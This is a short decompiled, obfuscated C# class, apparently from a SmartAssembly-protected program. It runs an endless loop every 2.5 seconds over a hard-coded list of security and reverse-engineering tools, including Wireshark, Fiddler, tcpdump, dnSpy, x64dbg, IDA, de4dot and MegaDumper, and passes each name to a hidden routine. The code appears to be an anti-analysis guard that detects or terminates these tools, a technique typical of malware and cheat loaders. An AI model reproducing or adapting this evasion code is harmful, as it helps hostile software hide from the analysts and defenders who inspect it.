using System;
using System.Collections.Generic;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace coxZRmDhvSAWo;

public sealed class ReEGuVGZtzhJ
{
	private static readonly List<string> f000057;

	private static readonly List<string> f000058;

	[NonSerialized]
	internal static GetString f000059;

	public static void QwimkMrTSXf()
	{
		while (true)
		{
			try
			{
				for (int i = 0; i < f000057.Count; i++)
				{
					int index = i;
					for (int j = 0; j < f000058.Count; j++)
					{
						int index2 = j;
						c00001b.LwVSnocgYFgL(f000057[index], f000058[index2]);
					}
				}
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static ReEGuVGZtzhJ()
	{
		Strings.CreateGetStringDelegate(typeof(ReEGuVGZtzhJ));
		f000057 = new List<string>
		{
			"http analyzer stand-alone", "fiddler", "effetech http sniffer", "firesheep", "IEWatch Professional", "dumpcap", "wireshark", "wireshark portable", "sysinternals tcpview", "NetworkMiner",
			"NetworkTrafficView", "HTTPNetworkSniffer", "tcpdump", "intercepter", "Intercepter-NG", "ollydbg", "x64dbg", "x32dbg", "dnspy", "dnspy-x86",
			"de4dot", "ilspy", "dotpeek", "dotpeek64", "ida64", "RDG Packer Detector", "CFF Explorer", "PEiD", "protection_id", "LordPE",
			"pe-sieve", "MegaDumper", "UnConfuserEx", "Universal_Fixer", "NoFuserEx", "cheatengine"
		};
		f000058 = new List<string> { "NetworkMiner", "NetworkTrafficView", "HTTPNetworkSniffer", "tcpdump", "intercepter", "Intercepter-NG" };
	}
}
